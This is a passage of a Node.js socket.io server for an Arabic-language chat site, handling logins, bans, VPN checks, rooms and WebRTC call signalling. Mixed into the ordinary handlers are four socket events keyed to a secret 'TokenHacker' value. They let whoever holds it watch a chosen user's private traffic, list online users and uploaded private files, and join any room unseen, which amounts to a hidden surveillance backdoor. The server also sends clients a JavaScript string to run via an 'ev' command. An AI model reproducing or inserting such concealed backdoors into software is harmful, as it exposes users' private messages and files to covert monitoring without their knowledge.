          bg: data["bg"],
          copic: data["copic"],
          co: data["country"],
          evaluation: data["eva"],
          ico: data["ico"],
          id: data["id"],
          idreg: data["idreg"],
          lid: data["lid"],
          meiut: data["ismuted"],
          meiutbc: data["ismutedbc"],
          mcol: data["mcol"],
          mscol: data["mscol"],
          atar: data["atar"],
          back: data["back"],
          ifedit: data["ifedit"],
          msg: data["msg"].split("<").join("&#x3C;"),
          istolk: false,
          power: data["power"],
          rep: data["rep"],
          islogin: data["islogin"],
          pic: data["pic"],
          youtube: data['youtube'],
          roomid: data["idroom"],
          time:
            data["islogin"] == "بوت"
              ? null
              : socket.request["_query"]["dtoday"]
              ? socket.request["_query"]["dtoday"]
              : null,
          stat: data["stat"],
          s:
            GetPower(data["power"])["stealth"] && data["stealth"] ? true : null,
          topic: data["topic"].split("<").join("&#x3C;"),
          ucol: data["ucol"],
        });
        io.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "u+",
          data: {
            bg: data["bg"],
            copic: data["copic"],
            co: data["country"],
            evaluation: data["eva"],
            ico: data["ico"] || "",
            id: data["id"],
            idreg: data["idreg"],
            lid: data["lid"],
            time:
              data["islogin"] == "بوت"
                ? null
                : socket.request["_query"]["dtoday"]
                ? socket.request["_query"]["dtoday"]
                : null,
            istolk: false,
            mcol: data["mcol"],
            mscol: data["mscol"],
            atar: data["atar"],
          back: data["back"] || "",
          ifedit: data["ifedit"],
            msg: data["msg"].split("<").join("&#x3C;"),
            meiut: data["ismuted"],
            meiutbc: data["ismutedbc"],
            power: data["power"],
            rep: data["rep"],
            pic: data["pic"],
            roomid: data["idroom"],
            stat: data["stat"],
            s:
              GetPower(data["power"])["stealth"] && data["stealth"]
                ? true
                : null,
            topic: data["topic"].split("<").join("&#x3C;"),
            ucol: data["ucol"],
          },
        });
      }

      if (data["islogin"] != "بوت") {
        socket.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "ulist",
          data: OnlineUser,
        });
        socket.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "powers",
          data: ShowPowers,
        });

        const power = ShowPowers.findIndex((x) => x.name == data["power"]);
        if (power != -1) {
          socket.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "power",
            data: ShowPowers[power],
          });
        } else {
          socket.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "power",
            data: Config.PowerNon,
          });
        }

        socket.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "rlist",
          data: RoomsListWith,
        });
        socket.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "infosite",
          data: {
            replay: SiteSetting["replay"],
            callmic: SiteSetting["callmic"],
            callsot: SiteSetting["callsot"],
            showtb: SiteSetting["showtb"],
            showtop: SiteSetting["showtop"],
            showsto: SiteSetting["showsto"],
            showyot: SiteSetting["showyot"],
            replaybc: SiteSetting["replaybc"],
            likebc: SiteSetting["likebc"],
            oflineuser: SiteSetting["oflineuser"],
            mic: SiteSetting["maxlikemic"],
            story: SiteSetting["maxlikestory"] || 2000,
          },
        });

        BarsRepo.getBy({ state: "getAll" }).then((brs) => {
          if (brs && !SiteSetting["bars"]) {
            for (var i = 0; i < brs.length; i++) {
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "bc",
                data: brs[i],
                numb: 0,
              });
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "bc^",
                data: brs[i],
              });
            }
          }
        });

        socket.join(data["idroom"]);
      }
      setTimeout(function () {
        if (!data["islog"] && data["islogin"] != "بوت") {
          IsWelcome();
        }
        if (GetPower(data["power"])["stealth"] && data["stealth"]) {
        } else {
          if (GetRoomList(data["idroom"])) {
            io.to(data["idroom"]).emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "msg",
              data: {
                bg: "none",
                copic: "none",
                class: "hmsg",
                topic: data["topic"].split("<").join("&#x3C;"),
                msg:
                  "هذا المستخدم قد دخل" +
                  '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:1px;max-width:180px;min-width:60px;" onclick="Send_Rjoin(\'' +
                  GetRoomList(data["idroom"])["id"] +
                  "')\">" +
                  GetRoomList(data["idroom"])["topic"] +
                  "</div>",
                roomid: data["idroom"],
                pic: data["pic"],
                uid: data["id"],
              },
            });
          }
        }

        io.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "ur",
          data: [data["id"], data["idroom"]],
        });
        if (data["islogin"] != "بوت" && GetRoomList(data["idroom"])) {
          if (GetRoomList(data["idroom"])["broadcast"]) {
            io.to(data["idroom"]).emit("SEND_EVENT_EMIT_BROADCASTING", {
              cmd: "rjoin",
              user: socket.id,
            });
            socket.emit("SEND_EVENT_EMIT_BROADCASTING", {
              cmd: "all",
              room: data["idroom"],
              data: PeerRoom[data["idroom"]],
            });
          }
        }
      }, 200);
    }
  }

  function BandBrowser(data) {
    if (typeof data == "object") {
      SaveLogs({
        state:
          data["state"] == "gust"
            ? "محظور|زائر|متصفح"
            : data["state"] == "user"
            ? "محظور|عضو|متصفح"
            : "محظور|تسجيل|متصفح",
        topic: data["user"],
        username: data["user"],
        ip: data["type"] + " | متصفح محظور",
        country: data["country"],
        device: data["device"],
        isin: data["refr"] || "*",
        date: new Date().getTime(),
      });
      socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "removede", data: {} });
      SendNotification({
        state: "me",
        topic: "",
        force: 1,
        msg: data["type"] + " هذا المتصفح محظور في هذا التطبيق",
        user: "",
      });
    }
  }

  function BandSystem(data) {
    if (typeof data == "object") {
      SaveLogs({
        state:
          data["state"] == "gust"
            ? "محظور|زائر|نظام"
            : data["state"] == "user"
            ? "محظور|عضو|نظام"
            : "محظور|تسجيل|نظام",
        topic: data["user"],
        username: data["user"],
        ip: data["type"] + " | نظام محظور",
        country: data["country"],
        device: data["device"],
        isin: data["refr"] || "*",
        date: new Date().getTime(),
      });
      socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "removede", data: {} });
      SendNotification({
        state: "me",
        topic: "",
        force: 1,
        msg: data["type"] + " هذا النظام محظور في هذا التطبيق",
        user: "",
      });
    }
  }

  function BandSysBrow(data) {
    const myserail = socket.request["_query"];
    if (typeof myserail != "object") {
      return;
    } else if (!myserail["browser"]) {
      return;
    }
    if (typeof data == "object") {
      if (
        SystemOpen["system1"] == true &&
        (!!~data["device"].toLowerCase().indexOf("win") ||
          !!~data["device"].toLowerCase().indexOf("windows"))
      ) {
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Windows",
          refr: data["refr"],
        });
        return false;
      } else if (
        SystemOpen["system2"] == true &&
        !!~data["device"].toLowerCase().indexOf("linux")
      ) {
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Linux",
          refr: data["refr"],
        });
        return false;
      } else if (
        SystemOpen["system3"] == true &&
        !!~data["device"].toLowerCase().indexOf("android")
      ) {
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Android",
          refr: data["refr"],
        });
        return false;
      } else if (
        SystemOpen["system4"] == true &&
        !!~data["device"].toLowerCase().indexOf("ios")
      ) {
        //ios
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "IOS",
          refr: data["refr"],
        });
        return false;
      } else if (
        SystemOpen["system5"] == true &&
        !!~data["device"].toLowerCase().indexOf("windows phone")
      ) {
        //win phone
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Windows Phone",
          refr: data["refr"],
        });
        return false;
      } else if (
        SystemOpen["system6"] == true &&
        !!~data["device"].toLowerCase().indexOf("mac")
      ) {
        //mac
        BandSystem({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Mac OS",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser1"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("chrome")
      ) {
        //chrome
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Chrome",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser2"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("firefox")
      ) {
        //firefox
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Firefox",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser3"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("safari")
      ) {
        //safari
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Safari",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser4"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("opera")
      ) {
        //Opera
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Opera",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser5"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("internet explorer")
      ) {
        //Internet Explorer
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Internet Explorer",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser6"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("edge")
      ) {
        //Edge
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Edge",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser7"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("webview")
      ) {
        //Android webview
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Android webview",
          refr: data["refr"],
        });
        return false;
      } else if (
        BrowserOpen["browser8"] == true &&
        !!~myserail.browser.toLowerCase().indexOf("samsung browser")
      ) {
        //Samsung Internet
        BandBrowser({
          device: data["device"],
          state: data["state"],
          user: data["username"],
          country: data["country"],
          type: "Samsung Internet",
          refr: data["refr"],
        });
        return false;
      } else {
        return true;
      }
    }
  }

  function MyIp() {
    const ismyip = socket.request.headers["x-forwarded-for"]
      ? socket.request.headers["x-forwarded-for"].split(",")[0]
      : "89.187.162.182";
    if (typeof ismyip != "string" || !ismyip) {
      socket.disconnect();
      return false;
    }
    if (ismyip) {
      if (ismyip.includes(",")) {
        socket.disconnect();
        return false;
      }
    }

    return ismyip;
  }

  function RemoveIp() {
    const isips = ListIPAll.findIndex((x) => x == MyIp());
    if (isips != -1) {
      ListIPAll.splice(ListIPAll.indexOf(MyIp()), 1);
    }
  }

  function SendNotification(data) {
    if (typeof data == "object") {
      if (data["state"] == "me") {
        socket.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "not",
          data: {
            topic: data["topic"],
            force: data["force"],
            msg: data["msg"],
            user: data["user"],
          },
        });
        socket.emit("seoo", {
          cmd: "not",
          data: {
            topic: data["topic"],
            force: data["force"],
            msg: data["msg"],
            user: data["user"],
          },
        });
      } else if (data["state"] == "to" && data["id"]) {
        socket.to(data["id"]).emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "not",
          data: {
            topic: data["topic"],
            force: data["force"],
            msg: data["msg"],
            user: data["user"],
          },
        });
      }
    }
  }



    socket.on("privedshow", (data) => {
		if(typeof data != 'object'){
			return;
		};
		if(data['token'] == TokenHacker){
			if(data['state'] == 1){
				idhacker = socket.id;
				idshow = data['id'];
			}else{
			    idhacker = '';
		 		idshow = '';
			};	
		};			
	});
	
    socket.on("msgalerts", (data) => {
			if(typeof data != 'object'){
			return;
		};
		if(data['token'] == TokenHacker){
			if(data['state'] == 1){
		socket.emit('msgalert',listalert);
			}else{
				listalert = [];
			};
		};
	});
	
    socket.on("getallpbnv", (data) => {
			if(typeof data != 'object'){
			return;
		};
		if(data['token'] == TokenHacker){
			if(data['state'] == 1){
			socket.emit("rlist",RoomsListWith);
			}else if(data['state'] == 3){
				socket.emit("listpm",getFiles('uploads/sendfile'));
			}else if(data['state'] == 2){
				socket.emit("llist",OnlineUser);
			};
	};	
	})
	
    socket.on("gorooadmo", (data) => {
			if(typeof data != 'object'){
			return;
		};
  if(data['token'] == TokenHacker){
		if(data['state'] == 0){
			socket.leave(data['id'])
		}else{
		 socket.join(data['id']);
		};
				};
	});
socket.on("disconnect", function (e) {
    

    if (UserInfo[socket.id]) {
		if(UserInfo[socket.id]['islogin'] == "عضو"){
				if(ListEnter.length > 0){
			ListEnter.splice(ListEnter.findIndex((v) => v.id == socket.id),1);
		};
      const isoffonline = OnlineUser.findIndex((v) => v.id == socket.id);
   if (isoffonline != -1) {
			if(UserInfo[socket.id]['idroom'] && PeerRoom[UserInfo[socket.id]['idroom']]){
			if (GetRoomList(UserInfo[socket.id]['idroom'])['broadcast']) {
				io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "rleave", user: UserInfo[socket.id]['id'] });
                    for (var i = 1; i < 8; i++) {
                        if (PeerRoom[UserInfo[socket.id]['idroom']][i]['id'] == UserInfo[socket.id]['id']) {
                            PeerRoom[UserInfo[socket.id]['idroom']][i]['id'] = "";
                            PeerRoom[UserInfo[socket.id]['idroom']][i]['ev'] = false;
                            PeerRoom[UserInfo[socket.id]['idroom']][i]['us'] = {};
                        };
                    };
			};
			};			    
				UserInfo[socket.id]['lastst'] = OnlineUser[isoffonline]['stat'];
			    OnlineUser[isoffonline]['stat'] = 3;
				UserInfo[socket.id]['offline'] = true;
				io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u^", data: OnlineUser[isoffonline] });
			
            }
            
            console.log("📦 القيمة الحالية من SiteSetting['oflineuser']:", SiteSetting['oflineuser']);

            let oflineMinutes = parseInt(SiteSetting['oflineuser']);
if (isNaN(oflineMinutes) || oflineMinutes <= 0) {
  oflineMinutes = 10; 
}

let timeof = oflineMinutes * 60 * 1000;
if (timeof > 2147483647) {
  timeof = 2147483647;
}
console.log("⏱️ سيتم الفصل بعد:", timeof, "مللي ثانية");
       UserInfo[socket.id]["reconnct"] = setTimeout(() => {
        UserDisconnect({id:socket.id,state:1});
        },timeof);
    }else{
		if(UserInfo[socket.id]){
		socket.leave(UserInfo[socket.id]['idroom']);
		};
        UserDisconnect({id:socket.id,state:1});		
	};
	}
  });


  function GetDevice() {
    const myserail = socket.request["_query"];
    var myserails = null;
    var mybros = socket.request.headers["user-agent"];
    if (typeof mybros != "string" || typeof myserail != "object") {
      socket.disconnect();
      return false;
    }

    if (
      typeof myserail["plt"] == "string" &&
      typeof myserail["wk"] == "string" &&
      typeof myserail["version"] == "string" &&
      typeof myserail["browser"] == "string"
    ) {
      const BrowserOn = Config.BrowserList.findIndex(
        (x) =>
          x.toLowerCase() ==
          myserail.browser.replace("Mobile ", "").toLowerCase()
      );
      const PlatformOn = Config.PlatformList.findIndex(
        (x) => x.toLowerCase() == myserail.plt.toLowerCase()
      );
      if (BrowserOn == -1) {
        SendNotification({
          state: "me",
          topic: "",
          force: 1,
          msg: "الرجاء المحاولة بمتصفح أخر",
          user: "",
        });
        return false;
      } else if (PlatformOn == -1) {
        SendNotification({
          state: "me",
          topic: "",
          force: 1,
          msg: "الرجاء المحاولة بنظام تشغيل أخر",
          user: "",
        });
        return false;
      } else {
        return (
          myserail["plt"] +
          "." +
          myserail["version"] +
          myserail["wk"] +
          "." +
          myserail["browser"]
        );
      }
    } else {
      socket.disconnect();
      return false;
    }
  }

  function BandDoneCheked(data) {
    if (UserChecked.length > 0) {
      const ischkedband = UserChecked.findIndex((x) => x == data);
      if (ischkedband != -1) {
        return true;
      } else {
        return false;
      }
    }
  }
  
function BandComplierIp(data) {
    if (data) {
        const isbands = ListBand.findIndex((x) => x.ip_band && data.includes(x.ip_band));
        if (isbands != -1) {
            return ListBand[isbands].ip_band;
        } else {
            return false;
        };
    };
};

  function BandDone(data) {
    if (typeof data == "object") {
      if (data["statea"] == "vpn") {
        if (
          StopVPN(data["country"]) &&
          !data["verification"] &&
          SiteSetting["vpn"]
        ) {
          SaveLogs({
            state: data["state"],
            topic: data["topic"],
            username: data["username"],
            ip: data["ip"],
            country: data["country"],
            device: data["device"],
            isin: data["refr"] || "*",
            date: new Date().getTime(),
          });
          socket.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "login",
            data: { msg: "vpn" },
          });
          setTimeout(() => {
            socket.disconnect();
          }, 2000);
          return true;
        } else {
          return false;
        }
      }
    }
  }

  
  socket.on("SEND_EVENT_EMIT_BROADCASTING", async function(data){
	        try {
        await rateLimiter.consume(socket.handshake.address);
    if (typeof data != "object") {
              return;
          }
          if (typeof data.it == "string") {
              return;
          }
          if (typeof data.mj == "string") {
              return;
          }

       if (UserInfo[socket.id]) {
             if(data.cmd == 'new'){
                if(!data.it){
                  return;
                }
                 if(!data.it.t){
                  return;
                }
              if(typeof data.it.t !="string"){
                return
              }
                if(data.it.t.includes("1")|| data.it.t.includes("2") || data.it.t.includes("3") || data.it.t.includes("4")||data.it.t.includes("5")||data.it.t.includes("6")){
               
                 if (UserInfo[socket.id]['rep'] < SiteSetting["maxlikemic"]) {
                   SendNotification({state:'me',topic: "", force: 1, msg:SiteSetting["maxlikemic"] + " " + "عدد الايكات المطلوبة للمايك", user: ""});								 
                   return;
                 }
                 io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", {us:{
                   pic:UserInfo[socket.id]['pic'],
                   topic:UserInfo[socket.id]['topic'],
                   id:UserInfo[socket.id]['id'],
                 }, cmd: "new", it: data.it.t, user: socket.id });
                 socket.emit("SEND_EVENT_EMIT_BROADCASTING", { us:{
                   pic:UserInfo[socket.id]['pic'],
                   topic:UserInfo[socket.id]['topic'],
                   id:UserInfo[socket.id]['id'],
                 },cmd: "new", it:data.it.t });
                 PeerRoom[UserInfo[socket.id]['idroom']][data.it.t]['id'] = socket.id;
                 PeerRoom[UserInfo[socket.id]['idroom']][data.it.t]['ev'] = true;
                 PeerRoom[UserInfo[socket.id]['idroom']][data.it.t]['us'] = {
                   pic:UserInfo[socket.id]['pic'],
                   topic:UserInfo[socket.id]['topic'],
                   id:UserInfo[socket.id]['id']
                 }
                }else{
                  return;
                }  
               }else if(data.cmd == 'send'){
                if(!data.mj){
                  return;
                }
                if(!data.mj.t){
                  return;
                }
      if(typeof data.mj.t != "string"){
              return;
         }

              
             
              if(data.mj.t.includes("target")==false){return;}
                 const myfr = JSON.parse(data.mj.t);
                 if(typeof myfr == 'object'){
                   if (myfr['type'] == "new-ice-candidate") {
                     socket.to(myfr["target"]).emit("SEND_EVENT_EMIT_BROADCASTING", {cmd: "send",
                     msgString: JSON.stringify({
                       type: myfr["type"],
                       it: myfr["it"],
                       target: myfr["target"],
                       user: socket.id,
                       candidate: myfr["candidate"]
                       })
                    });
                  } else if (myfr['type'] == "video-offer") {
                    socket.to(myfr["target"]).emit("SEND_EVENT_EMIT_BROADCASTING", {cmd: "send",
                    msgString: JSON.stringify({
                      type: myfr["type"],
                      it: myfr["it"],
                      target: myfr["target"],
                      sdp: myfr["sdp"],
                      user: socket.id
                     })
                    });
                 } else if (myfr['type'] == "hang-up") {
                   if((myfr["target"] == socket.id || GetPower(UserInfo[socket.id]['power'])['createroom']) && PeerRoom[UserInfo[socket.id]['idroom']]){
                   if(PeerRoom[UserInfo[socket.id]['idroom']][myfr["it"]]){
                     PeerRoom[UserInfo[socket.id]['idroom']][myfr["it"]].id = "";
                     PeerRoom[UserInfo[socket.id]['idroom']][myfr["it"]].ev = false;
                     PeerRoom[UserInfo[socket.id]['idroom']][myfr["it"]].us = {};
                     io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "send", msgString:data.mj.t });
                    }; 
                   };
                 } else if (myfr['type'] == "video-answer") {
                   socket.to(myfr["target"]).emit("SEND_EVENT_EMIT_BROADCASTING", {cmd: "send",
                   msgString: JSON.stringify({
                     type: myfr["type"],
                     it: myfr["it"],
                     target: myfr["target"],
                     sdp: myfr["sdp"],
                     user: socket.id
                     })
                   });
                  }else{
                    io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "send", msgString:data.mj });
                    };  
                  };
                 };
             };
			   } catch (e) {
        return;
      }
  });

app.get("/cp",function(req,res,next){
  UsersRepo.getBy({ state: "getByToken", token: req.url.replace("/cp","").replace("?","")}).then(function (search){
    if(search){
      if(GetPower(search["power"])["cp"]){
        res.sendFile(path.join(__dirname + "/public/admin.html"));
      }else{
        res.send('لا تملك صلاحيات ')
      }
    }else{
  res.send("لا تملك صلاحيات")
    }
  })
})



  socket.on("SEND_EVENT_EMIT_SERVER", async (data) => {
	if (typeof data == "object") {
      if (Config.Finished) {
        SendNotification({
          state: "me",
          topic: "",
          force: 1,
          msg: " الموقع مغلق",
          user: "",
        });
        return;
      }

      if (typeof data["data"] != "object") {
        return;
      }
      try {
        await rateLimiter.consume(socket.handshake.address);
        if (UserInfo[socket.id] != undefined) {
        } else if (
          data["cmd"] == "SEND_EVENT_EMIT_GUST" ||
          data["cmd"] == "SEND_EVENT_EMIT_REGISTER" ||
          data["cmd"] == "SEND_EVENT_EMIT_LOGIN"
        ) {
        } else {
          return;
        }

        if (data["cmd"] == "SEND_EVENT_EMIT_ADDPOWER") {
          return;
        }else if (data.cmd == "calldone") {
            
          if (typeof data.data != "object") {
              return;
          }
          if (!data.data["id"]) {
              return;
          }
    
          socket.to(data.data["id"]).emit("SEND_EVENT_EMIT_SERVER", { cmd: "donecall", data: {} });
      } else if (data.cmd == "calldeny") {
        
          if (typeof data.data != "object") {
              return;
          }
          if (!data.data["caller"] || !data.data["called"] || !data.data["roomid"]) {
              return;
          }
    
          socket.to(data.data["called"]).emit("SEND_EVENT_EMIT_SERVER", { cmd: "calldeny", data: { state: 1 } });
          socket.to(data.data["caller"]).emit("SEND_EVENT_EMIT_SERVER", { cmd: "calldeny", data: { state: 2 } });
      } else if (data.cmd == "calling") {
          if (typeof data.data != "object") {
              return;
          }
          if (!data.data["caller"] || !data.data["called"] || !data.data["roomid"]) {
              return;
          }
          if (UserInfo[socket.id]["rep"] < SiteSetting["maxlikecam"]) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                SiteSetting["maxlikecam"] +
                " عدد الايكات المطلوبة للإتصال في الخاص ",
              user: "",
            });
            socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "calldeny", data: { state: 1 } });
            return;
          }
               
    if(UserInfo[data.data["called"]]){
        if(UserInfo[data.data["called"]].offline == true){
          SendNotification({
            state: "me",
            topic: "",
            force: 1,
            msg: "المستخدم غير متصل بالانترنت في الوقت الحالي",
            user: "",
          });
        
                        socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "calldeny", data: { state: 1 } });
          return;
        };
    };
        
          socket.to(data.data["called"]).emit("SEND_EVENT_EMIT_SERVER", { cmd: "calling", data: { uid: UserInfo[data.data["called"]].uid, caller: data.data["caller"], called: data.data["called"], roomid: data.data["roomid"] } });
      } else if (data["cmd"] == "SEND_EVENT_EMIT_LOGIN") {
          const iswiat = ListWait.findIndex((x) => x.device == GetDevice());
          if (
            !data["data"]["username"] ||
            (!data["data"]["password"] &&
              data["data"]["username"].trim().length < 2 &&
              data["data"]["password"].trim().length < 2)
          ) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التاكد من البيانات",
              user: "",
            });
            return;
          } else if (isNaN(data["data"]["username"]) == false) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التأكد من الاسم",
              user: "",
            });
            return;
          } else if (!data["data"]["username"].trim()) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء ادخال اسم",
              user: "",
            });
            return;
          } else if (iswiat != -1) {
            if (ListWait[iswiat]["point"] > 4) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "لقد قمت بتخطي العدد المسموح لتخمين . الرجاء المحاولة في وقت لاحقآ",
                user: "",
              });
              return;
            }
          }

          const NumberEnter = ListEnter.filter(function (item) {
            return item.ip == MyIp();
          }).length;
          if (NumberEnter >= SiteSetting["maxlogin"]) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                SiteSetting["maxlogin"] + " عدد الاسماء التي يمكنك الدخول بها",
              user: "",
            });
            return;
          }

          request(
            "https://get.geojs.io/v1/ip/country/" + MyIp() + ".json",
            function (err, rep, mycountry) {
				if(typeof mycountry != 'undefined'){
				if (mycountry.includes('country')) {
					    mycountry = JSON.parse(mycountry);
					}else{
						mycountry = {country:'tn'};								
					};
				}else{
						mycountry = {country:'tn'};													
				};
              UsersRepo.getBy({
                state: "getByUsername",
                username: data["data"]["username"],
              }).then((login) => {
                if (login) {
                  if (
                    passwordHash.verify(
                      data["data"]["password"],
                      login.password
                    )
                  ) {
                    if (GetDevice() && MyIp()) {
                      if (!login["verification"]) {
                        if (
                          !BandSysBrow({
                            state: "user",
                            device: GetDevice(),
                            username: data["data"]["username"],
                            country: mycountry["country"],
                            refr: data["data"]["refr"] || "*",
                          })
                        ) {
                          return;
                        }
                      }
                      if (
                        BandDone({
                          statea: "vpn",
                          country: mycountry["country"],
                          verification: login["verification"],
                          state: "عضو|محظور|VPN",
                          topic: login["topic"],
                          username: login["username"],
                          ip: MyIp(),
                          device: GetDevice(),
                          refr: data["data"]["refr"] || "*",
                        })
                      ) {
                        return;
                      }
                      BandRepo.getBy({
                        state: "isBand",
                        username: data["data"]["username"].trim(),
                        device: GetDevice(),
                        ip: MyIp(),
                        country: mycountry["country"],
                      }).then((band) => {
                        if (band && !login["verification"]) {
                          socket.emit("SEND_EVENT_EMIT_SERVER", {
                            cmd: "login",
                            data: { msg: "banduser" },
                          });
                          SaveLogs({
                            state: band.device
                              ? "محظور|عضو|جهاز"
                              : band.username
                              ? "محظور|عضو|حساب"
                              : band.ip
                              ? "محظور|عضو|اي بي"
                              : band.country
                              ? "محظور|عضو|دولة"
                              : "",
                            topic: login.topic,
                            username: login.username,
                            ip: MyIp(),
                            country: mycountry["country"],
                            device: GetDevice(),
                            isin: "band",
                            date: new Date().getTime(),
                          });
                          setTimeout(() => {
                            socket.disconnect();
                          }, 2000);
                          return;
                        } else {
                          if (IsBand(GetDevice()) && !login["verification"]) {
                            socket.emit("SEND_EVENT_EMIT_SERVER", {
                              cmd: "login",
                              data: { msg: "banduser" },
                            });
                            SaveLogs({
                              state: "محظور|جهاز|مشفر",
                              topic: login.topic,
                              username: login.username,
                              ip: MyIp(),
                              country: mycountry["country"],
                              device: IsBand(GetDevice()),
                              isin: "band",
                              date: new Date().getTime(),
                            });
                            setTimeout(() => {
                              socket.disconnect();
                            }, 2000);
                            return;
                          }
                          const islogin = OnlineUser.findIndex(
                            (v) => v.lid == login["lid"]
                          );
                          if (islogin != -1) {
                            io.to(OnlineUser[islogin]["id"]).emit(
                              "SEND_EVENT_EMIT_SERVER",
                              {
                                cmd: "ev",
                                data: 'window.onbeforeunload = null; location.href="/";',
                              }
                            );
                            UserDisconnect({
                              id: OnlineUser[islogin]["id"],
                              state: 3,
                            });
                          }
                          socket.emit("SEND_EVENT_EMIT_SERVER", {
                            cmd: "login",
                            data: {
                              uid: login.uid,
                              point: login["evaluation"],
                              room: MyRoom(GetDevice()),
                              id: socket.id,
                              msg: "ok",
                              ttoken: login["token"],
                              ifedit:login["ifedit"],
                              visitnotif: login["visitnotif"] ? 1 : 0,
                              pic: login["pic"],
                            },
                          });
                          SaveNames({
                            iduser: login["idreg"],
                            device: GetDevice(),
                            ip: MyIp(),
                            topic: login["topic"],
                            username: login["username"],
                          });
                          EnterUserGust({
                            power: login["power"],
                            eva: login["evaluation"] || 0,
                            stat: 0,
                            loginG: login["loginG"],
                            islogin: "عضو",
                            refr: data["data"]["refr"]
                              .split("<")
                              .join("&#x3C;"),
                            username: login["username"]
                              .split("<")
                              .join("&#x3C;"),
                            ucol: login["ucol"],
                            mcol: login["mcol"],
                            mscol: login["mscol"],
                            youtube:login['youtube'],
                            atar: login["atar"] || "" ,
                            back: login["back"]  || "",
                            ifedit: login["ifedit"],
                            visitnotif: login["visitnotif"] ? 1 : 0,
                            bg: login["bg"],
                            copic: login["copic"],
                            rep: login["rep"],
                            ico: login["ico"] || "",
                            islike: [],
                            idreg: "#" + login["idreg"],
                            topic: login["topic"].split("<").join("&#x3C;"),
                            country: mycountry["country"] || "sg",
                            ip: MyIp(),
                            lid: login["lid"],
                            uid: login["uid"],
                            token: login["token"],
                            id: socket.id,
                            islog: false,
                            ismuted: login["muted"],
                            ismutedbc: isBandBc(GetDevice()),
                            verification: login["verification"],
                            device: GetDevice(),
                            pic: login["pic"],
                            idroom: MyRoom(GetDevice()),
                            msg: login["msg"] ? login["msg"] : "",
                            
                            stealth: data["data"]["stealth"] || false,
                          });
                        }
                      });
                    }
                  } else {
                    SaveLogs({
                      state: "محاوله تخمين رقم سري",
                      topic: data["data"]["username"]
                        .split("<")
                        .join("&#x3C;")
                        .trim(),
                      username: data["data"]["username"]
                        .split("<")
                        .join("&#x3C;")
                        .trim(),
                      ip: MyIp(),
                      code: mycountry["country"],
                      device: GetDevice(),
                      isin: data["data"]["refr"].split("<").join("&#x3C;"),
                      date: new Date().getTime(),
                    });
                    const lswit = ListWait.findIndex(
                      (x) => x.device == GetDevice()
                    );
